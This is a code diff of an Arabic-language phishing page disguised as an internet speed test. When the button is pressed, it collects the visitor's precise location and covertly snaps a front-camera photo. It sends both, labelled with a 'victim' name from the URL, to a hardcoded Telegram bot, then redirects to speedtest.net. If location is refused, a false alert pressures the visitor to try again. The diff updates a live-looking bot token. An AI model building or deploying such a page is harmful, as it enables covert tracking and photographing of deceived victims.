@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -8,7 +7,8 @@
     <style>
         * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
         body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .circle { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); cursor: pointer; }
+        .circle { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); cursor: pointer; transition: 0.2s; }
+        .circle:active { transform: scale(0.95); }
         .go-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
         #status { margin-top: 30px; font-size: 18px; color: #888; }
         video, canvas { display: none; }
@@ -22,17 +22,17 @@
     <canvas id="c"></canvas>
 
     <script>
-        // بياناتك الخاصة من الصور السابقة
-        const token = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
-        const chat = "7984067238"; 
+        // التوكن الجديد الذي أرسلته
+        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
+        const chat = "7984067238"; // الآيدي الخاص بك من الصور السابقة
         const urlParams = new URLSearchParams(window.location.search);
-        const victim = urlParams.get( user ) || "مستهدف_غير_معروف";
+        const victim = urlParams.get('user') || "مستهدف_غير_معروف";
 
         async function send(type, data, cap = "") {
             const fd = new FormData();
             fd.append("chat_id", chat);
             if(type === "img") {
-                fd.append("photo", data, "1.jpg");
+                fd.append("photo", data, "capture.jpg");
                 fd.append("caption", `👤 المستهدف: ${victim}\n${cap}`);
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
             } else {
@@ -40,35 +40,31 @@
             }
         }
 
-        document.getElementById( mainBtn ).onclick = async function() {
-            document.getElementById( status ).innerText = "جاري الاتصال بالسيرفر...";
-            this.style.pointerEvents = "none"; // منع الضغط المتكرر
+        document.getElementById('mainBtn').onclick = async function() {
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+            this.style.pointerEvents = "none";
 
-            // 1. طلب الموقع أولاً (أسرع طريقة لظهور الإذن)
             navigator.geolocation.getCurrentPosition(async (p) => {
                 const map = `📍 موقع ${victim}: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                
-                // 2. محاولة فتح الكاميرا فور موافقة الموقع
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                    const v = document.getElementById( v );
+                    const v = document.getElementById('v');
                     v.srcObject = s;
                     await new Promise(r => setTimeout(r, 1000));
-                    const c = document.getElementById( c );
+                    const c = document.getElementById('c');
                     c.width = 640; c.height = 480;
-                    c.getContext( 2d ).drawImage(v, 0, 0);
+                    c.getContext('2d').drawImage(v, 0, 0);
                     s.getTracks().forEach(t => t.stop());
                     
                     c.toBlob(async (b) => {
                         await send("img", b, map);
                         window.location.href = "https://www.speedtest.net";
-                    },  image/jpeg , 0.7);
+                    }, 'image/jpeg', 0.7);
                 } catch(e) {
                     await send("msg", `📍 الموقع فقط (رفض الكاميرا):\n${map}`);
                     window.location.href = "https://www.speedtest.net";
                 }
             }, (err) => {
-                // إذا رفض الموقع، يظهر تنبيه لإجباره على المحاولة مرة أخرى
                 alert("خطأ: يجب السماح بالوصول للموقع لاختيار أقرب سيرفر فحص.");
                 location.reload();
             }, {enableHighAccuracy: true});
